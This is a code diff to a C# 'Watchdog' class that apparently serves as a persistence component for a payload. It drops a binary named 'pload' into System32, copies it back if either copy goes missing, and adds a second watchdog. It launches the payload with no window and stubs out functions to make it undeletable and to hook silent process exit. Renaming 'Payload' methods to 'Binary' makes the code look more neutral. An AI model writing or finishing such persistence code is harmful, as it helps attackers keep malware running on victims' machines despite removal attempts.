@@ -11,8 +11,10 @@ class Watchdog : IWatchdog
 {
 
 
+    // Defaults to putting the file in the System32 directory and the binary name pload
     static string binaryPath = @"C:\\Windows\System32";
     static string binaryName = @"pload";
+    static string secondaryWatchdogName = @"Wdog2";
 
 
     static void Main(string[] args)
@@ -67,7 +69,7 @@ class Watchdog : IWatchdog
         }
     }
 
-    public static void CheckPayload(string destinationPath)
+    public static void CheckBinary(string destinationPath)
     {
         string currentDirectory = Directory.GetCurrentDirectory();
         string sourcePath = Path.Combine(currentDirectory, binaryName);
@@ -77,15 +79,12 @@ class Watchdog : IWatchdog
         if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath, sourcePath)){
             return;
         } 
-        else if(File.Exists(sourcePath)){
-            CopyPayload(destPathBinary, sourcePath);
-        }
         else{
-
+            CopyBinary(destPathBinary, sourcePath);
         }
     }
 
-    public static void CopyPayload(string destPathBinary, string sourcePath){
+    public static void CopyBinary(string destPathBinary, string sourcePath){
         // Check if the .exe exists in the current directory
         if (File.Exists(sourcePath))
         {
@@ -93,6 +92,17 @@ class Watchdog : IWatchdog
             try
             {
                 File.Copy(sourcePath, destPathBinary, overwrite: true);
+                Console.WriteLine($"'{binaryName}' found and copied to {destPathBinary}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error copying file: {ex.Message}");
+            }
+        }
+        else if(File.Exists(destPathBinary)){
+            try
+            {
+                File.Copy(destPathBinary, sourcePath, overwrite: false);
                 Console.WriteLine($"'{binaryName}' found and copied to {destPathBinary}");
             }
             catch (Exception ex)
@@ -133,11 +143,56 @@ class Watchdog : IWatchdog
         }
     }
 
-    public static void runPayload(){
+    public static void runPayload(string binaryPath, string arguments = "")
+    {
+        try
+        {
+            // Initialize the process start information
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = binaryPath,
+                Arguments = arguments,
+                UseShellExecute = false,   // Set to true if you want to use the system shell
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                CreateNoWindow = true      // Set to false if you want a window to appear
+            };
 
+            // Start the process
+            using (Process process = Process.Start(startInfo))
+            {
+                // Capture output if needed
+                string output = process.StandardOutput.ReadToEnd();
+                string errors = process.StandardError.ReadToEnd();
+
+                // Wait for the process to exit
+                process.WaitForExit();
+
+                // Output the results
+                Console.WriteLine("Output:");
+                Console.WriteLine(output);
+
+                if (!string.IsNullOrEmpty(errors))
+                {
+                    Console.WriteLine("Errors:");
+                    Console.WriteLine(errors);
+                }
+
+                Console.WriteLine("Process exited with code " + process.ExitCode);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Failed to run binary: {ex.Message}");
+        }
     }
 
-    public void createPayloadBinary()
+    public static void makeUndeletable()
+    {
+        throw new NotImplementedException();
+    }
+
+    public static void verifyUndeletable()
     {
         throw new NotImplementedException();
     }
@@ -157,15 +212,7 @@ class Watchdog : IWatchdog
         throw new NotImplementedException();
     }
 
-    public static void makeUndeletable()
-    {
-        throw new NotImplementedException();
-    }
-
-    public static void verifyUndeletable()
-    {
-        throw new NotImplementedException();
-    }
+    
 
     public static void setSilentProcessExit()
     {
